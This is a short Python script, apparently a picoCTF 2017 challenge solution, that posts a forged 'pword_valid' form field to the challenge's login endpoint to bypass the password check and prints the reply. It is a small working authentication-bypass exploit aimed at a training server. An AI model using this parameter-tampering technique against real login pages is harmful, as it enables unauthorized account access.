#!/usr/bin/env python3

import requests

url = 'http://shell2017.picoctf.com:4370/login'
data = {
  "pword_valid": True
}

headers = {
  "Content-Type": "application/x-www-form-urlencoded"
}
response = requests.post(url, data=data, headers=headers)
print(response.text)
